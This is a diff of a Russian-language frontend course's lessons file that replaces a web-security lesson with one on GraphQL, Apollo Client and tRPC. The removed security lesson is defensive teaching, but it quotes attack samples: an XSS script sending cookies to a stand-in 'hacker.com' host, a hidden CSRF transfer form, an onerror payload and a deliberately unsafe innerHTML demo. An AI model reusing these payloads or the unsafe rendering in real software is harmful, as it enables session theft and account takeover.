@@ -3491,193 +3491,192 @@ export const proLessons: Lesson[] = [
     "id": "pro-19",
     "moduleId": "pro",
     "level": 19,
-    "title": "Безопасность веб-приложений (AppSec): XSS, CSRF, CSP, CORS, JWT и Auth",
-    "subtitle": "Защита от XSS (DOMPurify), CSRF токены, SameSite cookies, Content Security Policy, CORS preflight и безопасное хранение JWT",
-    "description": "Освойте фронтенд-безопасность корпоративного уровня (AppSec): механизмы атак XSS (Stored, Reflected, DOM-based) и санитизацию контента, предотвращение CSRF-атак через SameSite cookies и анти-CSRF токены, настройку заголовков Content Security Policy (CSP), тонкости CORS-политики и безопасное хранение авторизационных токенов в HttpOnly cookies.",
+    "title": "Сетевой обмен данными нового поколения: GraphQL, Apollo Client, tRPC и gRPC-web",
+    "subtitle": "REST vs GraphQL, Schema & SDL, Normalized Cache (__typename:id), Optimistic UI, End-to-End Type Safety в tRPC и gRPC-web",
+    "description": "Освойте современные протоколы клиент-серверного взаимодействия: сравнение REST и GraphQL, решение проблем Over-fetching и N+1, написание Queries/Mutations/Subscriptions, архитектуру нормализованного кэша Apollo Client с оптимистичными обновлениями (Optimistic UI), революционный tRPC для сквозной TypeScript-типизации без кодогенерации и бинарный gRPC-web.",
     "estimatedMinutes": 75,
     "difficulty": "advanced",
     "tags": [
-      "appsec",
-      "web-security",
-      "xss",
-      "csrf",
-      "csp",
-      "cors",
-      "jwt",
-      "cookies",
-      "samesite",
-      "dompurify",
-      "owasp"
+      "graphql",
+      "apollo-client",
+      "trpc",
+      "grpc-web",
+      "protobuf",
+      "normalized-cache",
+      "optimistic-ui",
+      "api-design",
+      "type-safety",
+      "networking"
     ],
     "theory": {
-      "overview": "Фронтенд — это первая линия обороны веб-приложения, работающая прямо на устройстве пользователя в потенциально враждебной среде. Любая уязвимость в клиентском коде может привести к **краже сессионных токенов**, перехвату данных банковских карт и полной компрометации аккаунтов клиентов.\n\nВ этом уроке мы разберём ключевые угрозы из рейтинга **OWASP Top 10**: атаки межсайтового скриптинга (**XSS**), подделку межсайтовых запросов (**CSRF**), настройку строгих политик **CSP** и **CORS**, а также правила безопасной аутентификации на клиенте.",
+      "overview": "На протяжении десятилетий REST API был стандартом передачи данных в вебе. Однако с ростом сложности SPA-приложений и мобильных клиентов проявились его главные ограничения: избыточная загрузка ненужных полей (**Over-fetching**), каскадные цепочки запросов (**Under-fetching / N+1 проблема**) и необходимость ручной синхронизации типов между бэкендом и фронтендом.\n\nВ этом уроке мы разберём технологии сетевого взаимодействия нового поколения: декларативный язык запросов **GraphQL** с нормализованным кэшированием в **Apollo Client**, сквозную типизацию **tRPC** и высокопроизводительный бинарный **gRPC-web**.",
       "sections": [
         {
-          "title": "Анатомия XSS (Cross-Site Scripting) и правила санитизации",
-          "content": "Как злоумышленники внедряют вредоносный JavaScript код:\n\n1. **3 Типа атак XSS**:\n- **1. Stored (Хранимый) XSS**: вредоносный скрипт сохраняется в базе данных (например, в тексте комментария: `<script>fetch('https://hacker.com/steal?c='+document.cookie)</script>`) и исполняется у ВСЕХ пользователей, открывших страницу.\n- **2. Reflected (Отраженный) XSS**: скрипт внедряется через параметры URL (`?search=<script>...`) и возвращается сервером в ответе.\n- **3. DOM-based XSS**: уязвимость чисто на клиенте при чтении из `location.hash` или `document.referrer` и небезопасной вставке в DOM.\n\n2. **Опасные точки входа во фронтенде ⚠️**:\n- `element.innerHTML = userInput;`\n- `document.write(userInput);`\n- `dangerouslySetInnerHTML={{ __html: userInput }}` в React.\n- `eval()`, `new Function()`, `setTimeout(string)`.\n\n3. **Правила защиты (Sanitization)**:\n- Для обычного текста всегда используйте `element.textContent` (браузер автоматически экранирует спецсимволы `< > & \"`).\n- Для отображения форматированного HTML (Rich Text) **ОБЯЗАТЕЛЬНО санитизируйте** данные через библиотеку **DOMPurify**: `DOMPurify.sanitize(dirtyHtml)`.",
+          "title": "REST против GraphQL: Over-fetching, Under-fetching и язык схем (SDL)",
+          "content": "Фундаментальные различия архитектур API:\n\n1. **Проблемы традиционного REST API**:\n- **Over-fetching (Избыточная выборка)**: эндпоинт `/api/users/1` возвращает объект из 60 полей, хотя на карточке аватара нужны только `name` и `avatarUrl`. Результат: лишние мегабайты трафика на мобильных устройствах.\n- **Under-fetching / N+1 проблема (Недостаточная выборка)**: чтобы отобразить профиль с постами и комментариями, клиент вынужден делать 1 запрос к `/user/1`, затем 10 запросов к `/posts?userId=1`, и затем 30 запросов к `/comments?postId=...`.\n\n2. **Решение GraphQL (Single Endpoint + SDL)**:\n- Клиент обращается к **ЕДИНОМУ эндпоинту** (обычно `POST /graphql`) и в теле запроса строго описывает форму ответа.\n- **Schema Definition Language (SDL)**: сервер объявляет строгую типизированную схему, которая служит неизменным контрактом между командами.\n- Сервер отдает **РОВНО ТЕ ПОЛЯ**, которые запросил клиент — ни байтом больше!",
           "image": {
-            "src": "/images/lessons/web-security-appsec.svg",
-            "alt": "Web Security: XSS, CSRF, CSP, CORS и безопасный JWT",
-            "caption": "Векторы атак XSS/CSRF, защита через DOMPurify, Content Security Policy и HttpOnly cookies"
+            "src": "/images/lessons/web-graphql-trpc.svg",
+            "alt": "REST против GraphQL, Apollo Cache и сквозная типизация tRPC",
+            "caption": "Архитектура GraphQL: решение проблем Over-fetching, нормализованный кэш Apollo InMemoryCache и tRPC"
           },
           "codeExample": {
-            "language": "typescript",
-            "code": "// Безопасный рендеринг пользовательского HTML в React с DOMPurify\nimport React from 'react';\nimport DOMPurify from 'dompurify';\n\ninterface CommentProps {\n  rawUserHtml: string;\n}\n\nexport function SafeComment({ rawUserHtml }: CommentProps) {\n  // Санитизация: удаляет <script>, onmouseover, onerror и javascript: ссылки!\n  const cleanHtml = DOMPurify.sanitize(rawUserHtml, {\n    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],\n    ALLOWED_ATTR: ['href', 'target', 'rel'],\n  });\n\n  return (\n    <div className=\"comment-body\">\n      {/* Безопасная вставка после обязательной санитизации */}\n      <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />\n    </div>\n  );\n}\n\n// ❌ УЯЗВИМЫЙ КОД: Прямая вставка без санитизации ведет к краже сессии!\n// <div dangerouslySetInnerHTML={{ __html: rawUserHtml }} />",
-            "title": "Защита от XSS: санитизация пользовательского HTML через DOMPurify",
-            "explanation": "DOMPurify парсит HTML и вычищает опасные теги <script>, обработчики onerror/onload и вредоносные URI."
+            "language": "json",
+            "code": "# 1. Определение схемы на сервере (Schema Definition Language — SDL)\ntype User {\n  id: ID!\n  name: String!\n  email: String!\n  avatarUrl: String\n  posts(limit: Int): [Post!]!\n}\n\ntype Post {\n  id: ID!\n  title: String!\n  likesCount: Int!\n}\n\ntype Query {\n  user(id: ID!): User\n}\n\n# 2. Клиентский запрос (Query) — запрашиваем только то, что нужно для UI:\nquery GetUserProfile($userId: ID!) {\n  user(id: $userId) {\n    name\n    avatarUrl\n    posts(limit: 3) {\n      title\n      likesCount\n    }\n  }\n}",
+            "title": "Schema Definition Language (SDL) и точечный клиентский Query",
+            "explanation": "Клиент получает имя, аватар и 3 последних поста в одном HTTP-запросе без лишних полей и каскадных цепочек."
           }
         },
         {
-          "title": "Анатомия CSRF (Cross-Site Request Forgery) и SameSite Cookies",
-          "content": "Как устроена подделка межсайтовых запросов:\n\n1. **Механизм атаки CSRF**:\n- Пользователь авторизован в онлайн-банке (`bank.com`), его сессионная cookie сохранена в браузере.\n- Пользователь открывает вредоносный сайт `evil.com`.\n- На `evil.com` спрятана невидимая форма: `<form action=\"https://bank.com/api/transfer\" method=\"POST\"><input name=\"amount\" value=\"100000\"></form>`.\n- Скрипт отправляет форму: браузер **АВТОМАТИЧЕСКИ прикрепляет куки `bank.com`**, и банк выполняет перевод от имени жертвы!\n\n2. **Защита через атрибут кук `SameSite`**:\n- `Set-Cookie: sessionId=xyz; Secure; HttpOnly; SameSite=Strict`\n  - **`Strict`**: куки НИКОГДА не отправляются при переходе с внешних сайтов (100% защита от CSRF).\n  - **`Lax`** (по умолчанию в современных браузерах): куки отправляются только при безопасных навигациях верхнего уровня (клик по ссылке `<a>`), но блокируются при POST-запросах и iframe.\n\n3. **Анти-CSRF токены (Synchronizer Token Pattern)**:\n- Сервер генерирует случайный криптостойкий токен и отдает его клиенту.\n- Клиент обязан передавать его в кастомном HTTP-заголовке: `X-CSRF-Token: a1b2c3d4` (чужой сайт не может прочитать этот заголовок из-за SOP!).",
+          "title": "3 Операции в GraphQL: Query, Mutation и Subscriptions",
+          "content": "Как устроены операции в GraphQL:\n\n1. **Query (Чтение данных — аналог HTTP GET)**:\n- Идемпотентный запрос на получение данных. Поддерживает переменные (`$variable: Type`), директивы (`@include`, `@skip`) и фрагменты (`fragment`) для повторного использования полей в компонентах React.\n\n2. **Mutation (Изменение данных — аналог POST / PUT / DELETE)**:\n- Создание, обновление или удаление сущностей на сервере. Всегда возвращает обновленный объект, что позволяет клиенту мгновенно обновить локальный кэш без повторного GET-запроса!\n\n3. **Subscription (Реалтайм-поток через WebSockets)**:\n- Подписка на события сервера (новые сообщения чата, изменение статуса заказа). При возникновении события сервер пушит обновленные данные клиенту по постоянному соединению `graphql-ws`.",
           "codeExample": {
             "language": "typescript",
-            "code": "// Клиентский перехватчик Axios для автоматической передачи CSRF-токена\nimport axios from 'axios';\n\nexport const apiClient = axios.create({\n  baseURL: 'https://api.store.com',\n  withCredentials: true, // Передавать HttpOnly куки с запросами\n});\n\n// Читаем CSRF токен из мета-тега или безопасного cookie\napiClient.interceptors.request.use((config) => {\n  const csrfToken = document.querySelector('meta[name=\"csrf-token\"]')?.getAttribute('content');\n  \n  if (csrfToken && ['post', 'put', 'delete', 'patch'].includes(config.method?.toLowerCase() || '')) {\n    config.headers['X-CSRF-Token'] = csrfToken;\n  }\n  \n  return config;\n});",
-            "title": "Передача анти-CSRF токена в защищенном HTTP-заголовке",
-            "explanation": "Вредоносный сайт не может подделать кастомный заголовок X-CSRF-Token благодаря политике Same-Origin Policy."
+            "code": "// Клиентская мутация создания комментария с возвратом обновленного поста\nimport { gql, useMutation } from '@apollo/client';\n\nconst ADD_COMMENT_MUTATION = gql`\n  mutation AddComment($postId: ID!, $text: String!) {\n    addComment(postId: $postId, text: $text) {\n      id\n      text\n      createdAt\n      author {\n        name\n        avatarUrl\n      }\n      # Возвращаем обновленный счетчик комментариев родительского поста!\n      post {\n        id\n        commentsCount\n      }\n    }\n  }\n`;\n\nexport function useAddComment() {\n  const [addComment, { loading, error }] = useMutation(ADD_COMMENT_MUTATION);\n  return { addComment, loading, error };\n}",
+            "title": "GraphQL Mutation с получением обновленного состояния",
+            "explanation": "Мутация не просто отправляет данные, но сразу возвращает обновленный объект с commentsCount для авто-обновления кэша."
           }
         },
         {
-          "title": "Content Security Policy (CSP): Защита на уровне браузера",
-          "content": "CSP — мощнейший заголовок безопасности HTTP:\n\n1. **Заголовок `Content-Security-Policy`**:\n- Сообщает браузеру **белый список доверенных источников**, откуда разрешено загружать скрипты, стили, шрифты и куда отправлять данные.\n\n2. **Ключевые директивы CSP**:\n- `default-src 'self'` — по умолчанию разрешено загружать ресурсы только со своего домена.\n- `script-src 'self' https://trusted-cdn.com 'nonce-rAnd0m'` — запрещает инжектированные инлайн-скрипты без криптографического `nonce`.\n- `object-src 'none'` — блокирует устаревшие плагины (Flash, Java).\n- `frame-ancestors 'none'` — **блокирует Clickjacking** (запрещает встраивать сайт в чужие `<iframe>`).\n- `upgrade-insecure-requests` — автоматически переводит все HTTP-ссылки на HTTPS.",
+          "title": "Apollo Client: Нормализованный кэш и Optimistic UI",
+          "content": "Магия клиентского кэширования в Apollo Client / URQL:\n\n1. **Нормализованный кэш (`InMemoryCache`)**:\n- В отличие от REST, где каждый URL кэшируется целиком как сырой JSON, Apollo разбивает все вложенные ответы на плоские нормализованные объекты по ключу: **`__typename:id`** (например, `User:42`, `Post:101`).\n- **Автоматическая реактивность**: если мутация обновила имя пользователя `User:42` на странице настроек, **ВСЕ остальные компоненты на экране** (шапка профиля, сайдбар, список авторов) немедленно перерендериваются с новым именем без единого сетевого запроса!\n\n2. **Оптимистичный интерфейс (Optimistic UI)**:\n- Пользователь ставит лайк → UI **мгновенно увеличивает счетчик лайков** на экране (0 мс задержки!).\n- В фоне отправляется Mutation. Если сервер вернул 200 — оптимистичный ответ заменяется реальным. Если произошла ошибка — Apollo **автоматически откатывает UI** назад и показывает уведомление.",
           "codeExample": {
-            "language": "bash",
-            "code": "# Пример строгого производственного заголовка Content-Security-Policy:\nContent-Security-Policy: \\\n  default-src 'self'; \\\n  script-src 'self' https://api.sentry.io 'nonce-4AEemGb0xJptoIGBiZap'; \\\n  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; \\\n  font-src 'self' https://fonts.gstatic.com; \\\n  img-src 'self' data: https://images.unsplash.com; \\\n  connect-src 'self' https://api.store.com https://*.sentry.io; \\\n  frame-ancestors 'none'; \\\n  object-src 'none'; \\\n  base-uri 'self';",
-            "title": "Строгая политика CSP для защиты от XSS, Clickjacking и утечек данных",
-            "explanation": "Браузер заблокирует исполнение любого вредоносного скрипта, даже если хакеру удалось внедрить его в HTML."
+            "language": "typescript",
+            "code": "// Оптимистичное обновление лайка (Optimistic UI) в Apollo Client\nconst [likePost] = useMutation(LIKE_POST_MUTATION, {\n  // 1. Оптимистичный ответ: применяется к кэшу МГНОВЕННО до ответа сервера!\n  optimisticResponse: {\n    likePost: {\n      __typename: 'Post',\n      id: post.id,\n      likesCount: post.likesCount + 1,\n      isLiked: true,\n    },\n  },\n  // 2. В случае ошибки сети Apollo автоматически сделает Rollback!\n  onError: (err) => {\n    console.error('Не удалось поставить лайк, откат UI:', err);\n  },\n});",
+            "title": "Optimistic UI: мгновенный тактильный отклик интерфейса с авто-откатом",
+            "explanation": "Optimistic UI исключает ощущение лагов и задержек интернета, обеспечивая мгновенный отклик приложения."
           }
         },
         {
-          "title": "CORS и Безопасное хранение JWT Токенов (Access vs Refresh)",
-          "content": "Развенчание мифов об аутентификации и хранении секретов:\n\n1. **Где хранить JWT токены? (localStorage vs HttpOnly Cookie)**:\n- **`localStorage` ❌ ОПАСНО ДЛЯ СЕССИЙ**:\n  `localStorage` доступен любому JS-скрипту на странице. Если на сайте случится малейший XSS, скрипт хакера украдет токен строкой `localStorage.getItem('token')` за 1 миллисекунду!\n- **`HttpOnly` Cookie ✅ ПРОИЗВОДСТВЕННЫЙ СТАНДАРТ**:\n  Флаг `HttpOnly` запрещает JavaScript доступ к cookie (`document.cookie` вернет пустоту). Даже при наличии XSS злоумышленник **НЕ сможет украсть токен**!\n\n2. **Паттерн Access Token + Refresh Token**:\n- **Access Token** (короткоживущий, 5–15 минут): хранится **в оперативной памяти приложения (In-Memory JS variable)**.\n- **Refresh Token** (долгоживущий, 30 дней): хранится **в HttpOnly, Secure, SameSite=Strict Cookie** на эндпоинте `/api/auth/refresh`.\n\n3. **CORS (Cross-Origin Resource Sharing)**:\n- Не является защитой пользователя — защищает сервер от запросов из чужих браузеров.\n- Предварительный запрос `OPTIONS` (Preflight) проверяет заголовки `Access-Control-Allow-Origin` и `Access-Control-Allow-Credentials: true`.",
+          "title": "tRPC и gRPC-web: End-to-End Type Safety и бинарные протоколы",
+          "content": "Альтернативы GraphQL для максимальной скорости и безопасности:\n\n1. **Революция tRPC (TypeScript Remote Procedure Call) ⚡**:\n- Проблема GraphQL: необходимость писать SDL схемы, настраивать GraphQL Code Generator (`graphql-codegen`) и генерировать типы после каждого изменения.\n- **Идея tRPC**: если ваш фронтенд на React/Next.js и бэкенд на Node.js написаны на TypeScript, tRPC позволяет **напрямую импортировать типы бэкенд-роутера во фронтенд БЕЗ кодогенерации**!\n- При изменении типа аргумента на сервере TypeScript в VS Code **мгновенно подсвечивает ошибку на клиенте прямо в процессе ввода кода**!\n\n2. **gRPC-web и Protocol Buffers (Protobuf)**:\n- Бинарный протокол от Google поверх HTTP/2.\n- Вместо тяжелого текстового JSON данные сериализуются в компактный бинарный формат Protobuf (в 5–10 раз меньше по объему и быстрее в парсинге).\n- Идеально для Highload-систем, финтеха и стриминга котировок.",
           "codeExample": {
             "language": "typescript",
-            "code": "// Архитектура In-Memory Access Token + HttpOnly Refresh Token\nlet inMemoryAccessToken: string | null = null;\n\nexport const authService = {\n  setAccessToken(token: string) {\n    inMemoryAccessToken = token; // Токен живет только в памяти JS!\n  },\n  \n  getAccessToken() {\n    return inMemoryAccessToken;\n  },\n  \n  // Тихое обновление access токена через HttpOnly refresh cookie\n  async refreshSession() {\n    try {\n      const response = await fetch('/api/auth/refresh', {\n        method: 'POST',\n        credentials: 'include', // Автоматически отправляет HttpOnly cookie\n      });\n      const data = await response.json();\n      this.setAccessToken(data.accessToken);\n      return data.accessToken;\n    } catch (err) {\n      this.setAccessToken(null);\n      throw err;\n    }\n  }\n};",
-            "title": "Безопасное хранение Access токена в памяти JS и Refresh токена в HttpOnly Cookie",
-            "explanation": "Access токен не сохраняется на диск, а Refresh токен защищен от чтения скриптами флагом HttpOnly."
+            "code": "// 1. backend/routers/user.ts — Серверный роутер на tRPC\nimport { z } from 'zod';\nimport { router, publicProcedure } from '../trpc';\n\nexport const userRouter = router({\n  getById: publicProcedure\n    .input(z.object({ id: z.string().uuid() })) // Валидация входа через Zod\n    .query(async ({ input }) => {\n      return { id: input.id, name: 'Алексей', role: 'Senior' as const };\n    }),\n});\n\nexport type AppRouter = typeof appRouter;\n\n// 2. frontend/src/UserProfile.tsx — Использование на клиенте с автокомплитом!\nimport { trpc } from '../utils/trpc';\n\nexport function UserProfile({ userId }: { userId: string }) {\n  // Полный автокомплит эндпоинта 'getById', типов аргументов и возвращаемого объекта!\n  const { data, isLoading } = trpc.user.getById.useQuery({ id: userId });\n\n  if (isLoading) return <div>Загрузка...</div>;\n  return <h2>{data?.name} ({data?.role})</h2>; // data строго типизирован!\n}",
+            "title": "Сквозная типизация End-to-End Type Safety в tRPC",
+            "explanation": "tRPC связывает клиент и сервер единым контрактом TypeScript: ноль лишнего бойлерплейта, 100% защита от рассинхронизации типов."
           }
         }
       ],
       "seniorTips": [
-        "Никогда не храните токены сессий и чувствительные данные в `localStorage` или `sessionStorage` — используйте `HttpOnly, Secure, SameSite=Strict` cookies.",
-        "Всегда используйте `DOMPurify` перед любой вставкой HTML через `dangerouslySetInnerHTML` в React или `v-html` в Vue.",
-        "Настройте строгий заголовок `Content-Security-Policy` (CSP) с запретом `unsafe-inline` для скриптов и `frame-ancestors 'none'` для защиты от Clickjacking.",
-        "Никогда не используйте заголовок `Access-Control-Allow-Origin: *` вместе с `Access-Control-Allow-Credentials: true` — браузеры блокируют такую комбинацию из соображений безопасности.",
-        "Для защиты от CSRF всегда настраивайте атрибут cookie `SameSite=Lax` (или `Strict`) и передавайте кастомный анти-CSRF заголовок на все мутирующие запросы (POST/PUT/DELETE)."
+        "Используйте tRPC для монорепозиториев и Full-stack TypeScript проектов (Next.js / Node.js) — это дает максимальную скорость разработки и абсолютную типобезопасность без кодогенерации.",
+        "В GraphQL проектах всегда настраивайте `@graphql-codegen/cli` — он автоматически генерирует типизированные React-хуки (`useGetUserProfileQuery`) на основе ваших `.graphql` файлов.",
+        "Всегда запрашивайте поле `id` (или `_id`) и `__typename` во всех GraphQL-запросах — это необходимо для корректной работы нормализованного кэша Apollo InMemoryCache.",
+        "Для критических интерфейсов (лайки, добавление в корзину, удаление задач) всегда внедряйте `optimisticResponse` — это поднимает воспринимаемую скорость работы приложения до нативного уровня.",
+        "Не используйте GraphQL для простых CRUD-приложений без сложной связанности данных — оверхед на парсинг схем и резолверы превысит выгоду."
       ],
       "commonMistakes": [
         {
-          "bad": "// Сохранение JWT токена в localStorage\nlocalStorage.setItem('auth_token', token); // ❌ Любой XSS мгновенно украдет сессию!",
-          "good": "// Установка токена сервером в Set-Cookie: token=...; HttpOnly; Secure; SameSite=Strict",
-          "reason": "localStorage полностью открыт для чтения любым сторонним скриптом или XSS-инъекцией."
+          "bad": "// Забытое поле id в GraphQL Query\nquery GetUser { user { name email } /* ❌ Apollo не сможет нормализовать объект в кэше! */ }",
+          "good": "query GetUser { user { id name email } }",
+          "reason": "Без уникального идентификатора id нормализованный кэш InMemoryCache не может связать данные с сущностью и обновить UI."
         },
         {
-          "bad": "// Вставка непроверенного HTML из API\n<div dangerouslySetInnerHTML={{ __html: userPost.content }} />",
-          "good": "<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userPost.content) }} />",
-          "reason": "Пользовательский контент может содержать скрытые вредоносные теги <img src=x onerror=...>."
+          "bad": "// Создание отдельных GraphQL эндпоинтов для каждого экрана (превращение GraphQL в плохой REST)",
+          "good": "// Единая гибкая схема с графом сущностей и точечной выборкой полей на клиенте",
+          "reason": "GraphQL спроектирован как единый граф связей, где клиент сам решает, какую проекцию данных запросить."
         },
         {
-          "bad": "// Использование eval() для парсинга JSON или вычислений\nconst data = eval('(' + jsonString + ')');",
-          "good": "const data = JSON.parse(jsonString);",
-          "reason": "eval() исполняет любой переданный код с полными правами текущего скрипта, создавая критическую дыру безопасности."
+          "bad": "// Ручной кастинг типов через 'as any' при работе с API ответами",
+          "good": "// Использование tRPC или генерации типов через GraphQL Code Generator / Zod",
+          "reason": "Ручные типы быстро рассинхронизируются с реальным бэкендом, приводя к скрытым runtime ошибкам в продакшене."
         }
       ],
       "keyTakeaways": [
-        "XSS внедряет вредоносный JavaScript код; защита строится на textContent и DOMPurify.",
-        "CSRF подделывает запросы с куками; защита — SameSite=Strict cookies и анти-CSRF токены.",
-        "CSP ограничивает доверенные источники ресурсов и блокирует Clickjacking (frame-ancestors).",
-        "Хранение сессий в localStorage уязвимо к XSS; золотой стандарт — HttpOnly cookies.",
-        "CORS регулирует кросс-доменные запросы браузера через Preflight OPTIONS."
+        "GraphQL решает проблемы Over-fetching и N+1 через единый эндпоинт и строгую SDL схему.",
+        "Apollo InMemoryCache нормализует сущности по ключу __typename:id, обеспечивая глобальную реактивность.",
+        "Optimistic UI дает мгновенный тактильный отклик интерфейса с автоматическим откатом при ошибках.",
+        "tRPC обеспечивает сквозную TypeScript-типизацию между клиентом и сервером без кодогенерации.",
+        "gRPC-web использует бинарный Protobuf для сверхбыстрой передачи данных в высоконагруженных системах."
       ]
     },
     "sandbox": {
-      "initialHtml": "<div id=\"security-sandbox-app\">\n  <h3>AppSec & XSS Защита: Демонстратор</h3>\n  <div style=\"margin-bottom:12px;\">\n    <label style=\"color:#8b949e; font-size:12px;\">Входные данные от пользователя (потенциальный XSS):</label>\n    <input id=\"xss-input\" value=\"&lt;img src='invalid' onerror='alert(\\\"🚨 XSS Уязвимость: Куки украдены!\\\")'&gt; Привет мир!\" style=\"width:100%; background:#161b22; border:1px solid #30363d; color:#e6edf3; padding:8px; border-radius:6px; margin-top:4px;\" />\n  </div>\n  <div style=\"display:flex; gap:8px; margin-bottom:12px;\">\n    <button id=\"btn-unsafe-render\" style=\"background:#f85149; color:#fff; border:none; padding:8px 12px; font-weight:bold; cursor:pointer;\">1. Опасный innerHTML (Без очистки)</button>\n    <button id=\"btn-safe-render\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 12px; font-weight:bold; cursor:pointer;\">2. Безопасный DOMPurify</button>\n  </div>\n  <div id=\"security-output\" style=\"border:1px solid #30363d; padding:12px; border-radius:6px; min-height:50px; background:#161b22;\"></div>\n</div>",
-      "initialCss": "#security-sandbox-app { font-family: monospace; color: #e6edf3; padding: 16px; background: #0d1117; border-radius: 8px; }",
-      "initialJs": "const output = document.getElementById('security-output');\nconst input = document.getElementById('xss-input');\n\ndocument.getElementById('btn-unsafe-render').onclick = () => {\n  output.innerHTML = '<span style=\"color:#f85149;\">⚠️ [Опасный рендеринг]:</span> ' + input.value;\n};\n\ndocument.getElementById('btn-safe-render').onclick = () => {\n  // Симуляция работы DOMPurify: удаление опасных тегов и обработчиков onerror/onload/script\n  const sanitized = input.value\n    .replace(/<script[\\s\\S]*?<\\/script>/gi, '')\n    .replace(/onerror\\s*=\\s*['\"][^'\"]*['\"]/gi, '')\n    .replace(/onload\\s*=\\s*['\"][^'\"]*['\"]/gi, '');\n  \n  output.innerHTML = '<span style=\"color:#2dff8a;\">🛡️ [DOMPurify Очищено]:</span> ' + sanitized;\n};",
-      "instructions": "Практика с XSS-безопасностью:\n1. Нажмите '1. Опасный innerHTML' — вредоносный обработчик onerror сработает в браузере\n2. Нажмите '2. Безопасный DOMPurify' — опасный код вычищается, отображается только чистый безопасный контент"
+      "initialHtml": "<div id=\"graphql-sandbox-app\">\n  <h3>GraphQL & tRPC Network Симулятор</h3>\n  <div style=\"display:flex; gap:8px; margin-bottom:12px;\">\n    <button id=\"btn-gql-query\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 14px; font-weight:bold; cursor:pointer;\">1. GraphQL Query (Точечные поля)</button>\n    <button id=\"btn-optimistic-like\" style=\"background:#ff2bd6; color:#fff; border:none; padding:8px 14px; font-weight:bold; cursor:pointer;\">2. Optimistic Like (0 мс UI!)</button>\n  </div>\n  <pre id=\"gql-log\" style=\"color:#e6edf3; font-size:12px; line-height:1.5; background:#161b22; padding:12px; border-radius:6px; min-height:80px;\"></pre>\n</div>",
+      "initialCss": "#graphql-sandbox-app { font-family: monospace; color: #e6edf3; padding: 16px; background: #0d1117; border-radius: 8px; }",
+      "initialJs": "const log = document.getElementById('gql-log');\nlet likes = 42;\n\ndocument.getElementById('btn-gql-query').onclick = () => {\n  log.textContent = '🚀 [POST /graphql] Payload: query { user(id: 1) { name avatarUrl } }\\n';\n  log.textContent += '📦 Ответ сервера (24 байта, 0 лишних полей!):\\n';\n  log.textContent += JSON.stringify({ data: { user: { __typename: 'User', id: '1', name: 'Иван Иванов', avatarUrl: '/avatar.jpg' } } }, null, 2);\n  log.style.color = '#2dff8a';\n};\n\ndocument.getElementById('btn-optimistic-like').onclick = () => {\n  likes++;\n  log.textContent = `⚡ [Optimistic UI]: Счетчик мгновенно обновлен в кэше Apollo: ${likes} ❤️ (0 мс)\\n`;\n  log.textContent += '⏳ Отправка мутации mutation LikePost { ... } на сервер...\\n';\n  setTimeout(() => {\n    log.textContent += `✅ Сервер подтвердил транзакцию 200 OK! Кэш синхронизирован: Post:101.likesCount = ${likes}`;\n  }, 400);\n  log.style.color = '#ff2bd6';\n};",
+      "instructions": "Практика с GraphQL и Apollo Cache:\n1. Нажмите '1. GraphQL Query' — сервер вернет ровно запрошенные поля без лишнего трафика\n2. Нажмите '2. Optimistic Like' — UI среагирует мгновенно за 0 мс до завершения сетевого запроса"
     },
     "task": {
-      "title": "Реализация безопасного сервиса аутентификации и санитизации комментариев",
-      "scenario": "Создайте модуль безопасности: 1) Функцию renderSafeUserComment(dirtyHtml), которая санитизирует входную строку с помощью DOMPurify перед вставкой; 2) Класс AuthSessionService, хранящий access-токен строго в приватной переменной памяти (In-Memory) и запрашивающий обновление через credentials: 'include'.",
+      "title": "Настройка Apollo Client с InMemoryCache и создание Optimistic Mutation",
+      "scenario": "Настройте Apollo Client для React-приложения: инициализируйте InMemoryCache с кастомной нормализацией и реализуйте функцию toggleLikePost(postId, currentLikes), использующую optimisticResponse для мгновенного обновления количества лайков в кэше.",
       "criteria": [
-        "renderSafeUserComment использует DOMPurify.sanitize с белым списком тегов",
-        "AuthSessionService хранит accessToken в памяти без записи в localStorage",
-        "Метод refreshTokens() использует fetch с credentials: 'include'",
-        "Реализованы методы setToken, getToken, clearToken"
+        "Инициализирован ApolloClient с uri ('https://api.domain.com/graphql') и InMemoryCache",
+        "Определена мутация TOGGLE_LIKE с получением полей id, likesCount, isLiked",
+        "В useMutation передан optimisticResponse с __typename: 'Post'",
+        "Обработана ошибка с откатом состояния в onError"
       ],
       "starterCode": {
-        "js": "// Реализуйте модуль безопасности фронтенда\nimport DOMPurify from 'dompurify';\n\nexport function renderSafeUserComment(dirtyHtml) {\n  // Ваш код\n}\n\nexport class AuthSessionService {\n  // Ваш код\n}"
+        "js": "// Настройте Apollo Client и Optimistic Mutation\nimport { ApolloClient, InMemoryCache, gql } from '@apollo/client';\n\n// 1. Инициализация клиента\nexport const client = new ApolloClient({\n  // Ваш код\n});\n\n// 2. Функция мутации\nexport const TOGGLE_LIKE_MUTATION = gql`\n  # Ваш код\n`;"
       },
       "hints": [
-        "DOMPurify.sanitize(dirtyHtml, { ALLOWED_TAGS: ['b', 'i', 'p', 'a'] })",
-        "fetch('/api/auth/refresh', { method: 'POST', credentials: 'include' })"
+        "client = new ApolloClient({ uri: 'https://api.store.com/graphql', cache: new InMemoryCache() })",
+        "optimisticResponse: { toggleLike: { __typename: 'Post', id: postId, likesCount: currentLikes + 1, isLiked: true } }"
       ],
       "solution": {
-        "js": "import DOMPurify from 'dompurify';\n\n// 1. Безопасная санитизация пользовательского ввода\nexport function renderSafeUserComment(dirtyHtml) {\n  return DOMPurify.sanitize(dirtyHtml, {\n    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],\n    ALLOWED_ATTR: ['href', 'target', 'rel'],\n  });\n}\n\n// 2. Безопасное хранение Access токена в памяти In-Memory\nexport class AuthSessionService {\n  constructor() {\n    this._accessToken = null;\n  }\n\n  setToken(token) {\n    this._accessToken = token;\n  }\n\n  getToken() {\n    return this._accessToken;\n  }\n\n  clearToken() {\n    this._accessToken = null;\n  }\n\n  async refreshTokens() {\n    const response = await fetch('/api/auth/refresh', {\n      method: 'POST',\n      headers: { 'Content-Type': 'application/json' },\n      credentials: 'include', // Отправка HttpOnly refresh cookie\n    });\n    \n    if (!response.ok) {\n      this.clearToken();\n      throw new Error('Сессия истекла');\n    }\n    \n    const data = await response.json();\n    this.setToken(data.accessToken);\n    return data.accessToken;\n  }\n}\n\nconsole.log('Модуль безопасности 